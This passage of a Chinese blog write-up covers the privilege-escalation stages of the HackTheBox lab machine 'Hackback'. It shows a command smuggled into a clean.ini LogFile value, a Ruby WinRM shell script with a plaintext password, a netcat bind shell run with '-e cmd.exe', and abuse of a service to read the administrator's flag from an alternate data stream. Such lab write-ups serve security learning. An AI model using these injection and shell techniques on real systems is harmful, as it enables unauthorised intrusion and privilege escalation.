<p>出现隐藏目录<code>scripts</code><br>再次查询，出现大量脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS hackback\simple@HACKBACK &gt; dir -force</span><br><span class="line">    Directory: C:\util\scripts</span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12/13/2018   2:54 PM                spool</span><br><span class="line">-a----       12/21/2018   5:44 AM             84 backup.bat</span><br><span class="line">-a----        7/16/2019  12:44 AM             39 batch.log</span><br><span class="line">-a----        7/15/2019   4:39 AM             46 clean.ini</span><br><span class="line">-a-h--       12/13/2018   2:58 PM            330 dellog.bat</span><br><span class="line">-a----        12/8/2018   9:17 AM           1232 dellog.ps1</span><br><span class="line">-a----        7/15/2019   4:39 AM             35 log.txt</span><br></pre></td></tr></table></figure></p>
<p>虽然没有权限阅读<code>dellog.bat</code>，但是发现<code>clean.ini</code>中调用了<code>log.txt</code>,那么将尝试写入shell，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime=100</span><br><span class="line">LogFile=c:\util\scripts\log.txt &amp; whoami #这里能附加命令</span><br><span class="line">Directory=c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在前面我们知道Windows为64位，上传64位nc,上传脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/ruby</span><br><span class="line">require &apos;winrm-fs&apos;</span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  endpoint: &apos;http://10.10.10.128:5985/wsman&apos;,</span><br><span class="line">  user: &apos;simple&apos;,</span><br><span class="line">  password: &apos;ZonoProprioZomaro:-(&apos;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">file_manager = WinRM::FS::FileManager.new(conn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class String</span><br><span class="line">  def tokenize</span><br><span class="line">    self.</span><br><span class="line">      split(/\s(?=(?:[^&apos;&quot;]|&apos;[^&apos;]*&apos;|&quot;[^&quot;]*&quot;)*$)/).</span><br><span class="line">      select &#123;|s| not s.empty? &#125;.</span><br><span class="line">      map &#123;|s| s.gsub(/(^ +)|( +$)|(^[&quot;&apos;]+)|([&quot;&apos;]+$)/,&apos;&apos;)&#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command=&quot;&quot;</span><br><span class="line"></span><br><span class="line">conn.shell(:powershell) do |shell|</span><br><span class="line">    until command == &quot;exit\n&quot; do</span><br><span class="line">        output = shell.run(&quot;-join($id,&apos;PS &apos;,$(whoami),&apos;@&apos;,$env:computername,&apos; &apos;,$((gi $pwd).Name),&apos;&gt; &apos;)&quot;)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = STDIN.gets</span><br><span class="line">        if command.start_with?(&apos;UPLOAD&apos;) then</span><br><span class="line">            upload_command = command.tokenize</span><br><span class="line">            print(&quot;Uploading &quot; + upload_command[1] + &quot; to &quot; + upload_command[2])</span><br><span class="line">            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|</span><br><span class="line">                puts(&quot;#&#123;bytes_copied&#125; bytes of #&#123;total_bytes&#125; bytes copied&quot;)</span><br><span class="line">            end</span><br><span class="line">            command = &quot;echo `nOK`n&quot;</span><br><span class="line">        end</span><br><span class="line">        if command.start_with?(&apos;DOWNLOAD&apos;) then</span><br><span class="line">            download_command = command.tokenize</span><br><span class="line">            print(&quot;Downloading &quot; + download_command[1] + &quot; to &quot; + download_command[2])</span><br><span class="line">            file_manager.download(download_command[1], download_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|</span><br><span class="line">                puts(&quot;#&#123;bytes_copied&#125; bytes of #&#123;total_bytes&#125; bytes copied&quot;)</span><br><span class="line">            end</span><br><span class="line">            command = &quot;echo `nOK`n&quot;</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        output = shell.run(command) do |stdout, stderr|</span><br><span class="line">            STDOUT.print(stdout)</span><br><span class="line">            STDERR.print(stderr)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    puts(&quot;Exiting with code #&#123;output.exitcode&#125;&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPLOAD /root/Desktop/nc64.exe C:\windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure>
<p>稍稍修改一下,这里使用的<code>echo</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">clean.ini</span><br><span class="line">[Main]</span><br><span class="line">LifeTime=100</span><br><span class="line">LogFile=c:\util\scripts\log.txt &amp; c:\windows\system32\spool\drivers\color\nc64.exe 127.0.0.1 -lvp 10000 -e cmd.exe</span><br><span class="line">Directory=c:\inetpub\logs\logfiles</span><br></pre></td></tr></table></figure></p>
<p>这里我要等一会，我等了半小时…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# proxychains nc 127.0.0.1 10000</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">hackback\hacker</span><br></pre></td></tr></table></figure></p>
<p>最后得到了一串字符串(<em>^▽^</em>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line">922449f8e******************</span><br></pre></td></tr></table></figure></p>
<p>但是游戏还是没有结束，任务是找到root.txt<br>前面找到的，可疑的服务<br><img src="https://i.loli.net/2019/07/16/5d2d44ed5f57d64524.png" alt="12.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hacker\Desktop&gt;sc query userlogger</span><br><span class="line">sc query userlogger</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 1  STOPPED</span><br><span class="line">        WIN32_EXIT_CODE    : 1077  (0x435)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">C:\Users\hacker\Desktop&gt;sc qc userlogger</span><br><span class="line">sc qc userlogger</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: userlogger</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 3   DEMAND_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : c:\windows\system32\UserLogger.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : User Logger</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>第三天了<br>看看找到了什么<br>将<code>c:\windows\system32\UserLogger.exe</code>下载下来,使用IDE打开。<br>发现当SCM（服务控制管理器）使用参数（即日志文件的路径）启动服务时，服务会继续将日志文件的权限提升为”Everyone”。使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows\system32&gt;sc.exe start UserLogger &quot;c:\users\administrator\desktop\root.txt:&quot;</span><br><span class="line">&apos;:&apos;允许忽略或绕过`.log`自己附加或连接到路径，而是写入文件的备用数据流（ADS）</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; cat c:\users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
<p>没有flag，只有一头驴<br>原因：进入<code>administrator</code>,发现没有自动继承权限<br>看看这篇帖子讲的<a href="https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html?m=1" target="_blank" rel="noopener">Microsoft（R）诊断中心标准收集器服务</a><br>最后基本确定在数据流中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator&gt; mkdir test</span><br><span class="line">PS C:\users\administrator\test&gt; copy c:\users\administrator\desktop\root.txt .</span><br><span class="line">PS C:\users\administrator\test&gt; Get-Item root.txt -Force -stream *</span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt::$DATA  </span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt::$DATA                                                                    </span><br><span class="line">PSDrive       : C                                                                                  </span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False                                                                              </span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : :$DATA                                                                             </span><br><span class="line">Length        : 1958                                                                               </span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:.log    </span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt:.log                                                                      </span><br><span class="line">PSDrive       : C                                                                                  </span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : .log</span><br><span class="line">Length        : 116</span><br><span class="line"></span><br><span class="line">PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test\root.txt:flag.txt</span><br><span class="line">PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\test                  </span><br><span class="line">PSChildName   : root.txt:flag.txt</span><br><span class="line">PSDrive       : C</span><br><span class="line">PSProvider    : Microsoft.PowerShell.Core\FileSystem                                               </span><br><span class="line">PSIsContainer : False</span><br><span class="line">FileName      : C:\users\administrator\test\root.txt                                               </span><br><span class="line">Stream        : flag.txt</span><br><span class="line">Length        : 35</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\administrator\test&gt; get-content root.txt -stream flag.txt</span><br><span class="line">6d29b069d4de8eed1a2fle**********</span><br></pre></td></tr></table></figure>
<h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2019/07/14/2019-07-14/">对Hackback的测试</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 EV 的个人博客">EV</a></p>
        <p><span>发布时间:</span>2019年07月14日 - 15时58分</p>
        <p><span>最后更新:</span>2019年07月23日 - 13时46分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2019/07/14/2019-07-14/" title="对Hackback的测试">http://www.lanbainan.cn/2019/07/14/2019-07-14/</a>
            <span class="copy-path" data-clipboard-text="原文: http://www.lanbainan.cn/2019/07/14/2019-07-14/　　作者: EV" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2019/07/24/2019-07-24/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          对Escalate_Linux:1的测试
        
      </div>
    </a>
  
  
    <a href="/2019/07/07/2019-07-07/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">DDoS攻击检测与防御</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>


  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hackback"><span class="toc-number">1.</span> <span class="toc-text">Hackback</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试ing"><span class="toc-number">1.2.</span> <span class="toc-text">测试ing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#url测试"><span class="toc-number">1.3.</span> <span class="toc-text">url测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP代码注入"><span class="toc-number">1.4.</span> <span class="toc-text">PHP代码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取shell"><span class="toc-number">1.5.</span> <span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-number">1.6.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">1.7.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#到此结束"><span class="toc-number">2.</span> <span class="toc-text">到此结束</span></a></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>






<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
      <section id="comments">
  <div id="valine_thread" style="margin: 30px;"></div>
        <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
        <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
        <script>
            var GUEST_INFO = ['nick','mail','link'];
            var guest_info = 'nick,mail,link'.split(',').filter(function(item){
                return GUEST_INFO.indexOf(item) > -1
            });
            var notify = 'true' == true;
            var verify = 'true' == true;
            var valine = new Valine();
            valine.init({
                el: '#valine_thread',
                notify: notify,
                verify: verify,
                appId: "AphjXIvvoDr8mPjQaDqYnoGg-gzGzoHsz",
                appKey: "wVPDX41uy60qD4RljgWFY7hy",
                placeholder: "评论一下,Ctrl+Enter回复",
                pageSize:'10',
                avatar:'robohash',
                lang:'zh-cn'
            })
        </script>
</section>

    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/07/24/2019-07-24/" title="上一篇: 对Escalate_Linux:1的测试">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2019/07/07/2019-07-07/" title="下一篇: DDoS攻击检测与防御">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/2019-11-13/">记一次域渗透学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/04/2019-11-04/">记录一下Nexus存储库管理器远程代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/2019-10-10/">对登录框的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/22/2019-09-22/">记一次对Win2008(x64) 数据中心版的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/17/2019-09-17/">记一次对2003 企业版的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/11/2019-08-11/">对Pentestit Lab v12的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/04/2019-08-04/">对symfonos:3的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/03/2019-08-03/">对symfonos:2的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/29/2019-07-29/">对hackme:1的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/2019-07-24/">对Escalate_Linux:1的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/2019-07-14/">对Hackback的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/07/2019-07-07/">DDoS攻击检测与防御</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/04/2019-07-04/">越权小测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/03/2019-07-03/">对SwagShop的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/21/2019-06-21/">对HTB Netmon的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/16/2019-06-16/">鸡藕椒盐味浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/12/2019-06-12/">XOR编码实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/04/2019-06-04/">将Hex转换为base64</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/30/2019-05-30/">对于DC-5和DC-6的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/2019-05-23/">对于DC-2和DC-4的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/16/2019-04-16/">对于Billu_b0x的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/15/2019-04-15/">对于JIS-CTF-Vuln的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/13/2019-04-13/">HEXO持续优化</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/2019-04-12/">对于unknowndevice64的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/2019-04-11/">CommandoVM测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/2019-04-10/">对于DC-1的测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/2019-04-04/">Linux防火墙-iptables/firewalld</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/2019-04-03/">中间人攻击-ARP毒化</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/2019-3-28/">Sqls-Libs闯关（基础版）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/2019-3-26/">Mysql加固</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/21/2019-1-21/">在cgi模式下的phpmyadmin</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/18/2019-1-18/">Web渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/12/2018-11-12/">提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/16/2018-10-16/">缓冲区溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/08/2018-09-08/">使用Python爬虫打造翻译工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/21/2018-8-21/">主动信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/29/2018-07-29/">Python爬虫学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/2018-7-22/">被动信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/netcat/">NETCAT学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/hexo/">搭建hexo博客的坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/25/Python1/">Python的类型与运算一</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>

</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2019 EV - <img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"><a href="http://www.beian.miit.gov.cn/" target="_blank">蜀ICP备18020607号</a>
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >小站到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
    <script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>


<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'DYbtIbaN-q9OYJ_9pJm63NQmxo1zxuQcMf8_BryEeYU', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->



	<script>
	var _hmt = _hmt || [];
	(function() {
	  var hm = document.createElement("script");
	  hm.src = "//hm.baidu.com/hm.js?ef5d51eef2343ca823c8c93e3b66057c";
	  var s = document.getElementsByTagName("script")[0]; 
	  s.parentNode.insertBefore(hm, s);
	})();
	</script>


<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>



  </div>
<!--搞怪标题-->
<script type="text/javascript" src="/js/crash_cheat.js"></script>
<!--点击小红心-->
<script type="text/javascript" src="/js/clicklove.js"></script>
<!--看板娘-->
<script src="/live2d-widget/autoload.js"></script>
</body>
</html>
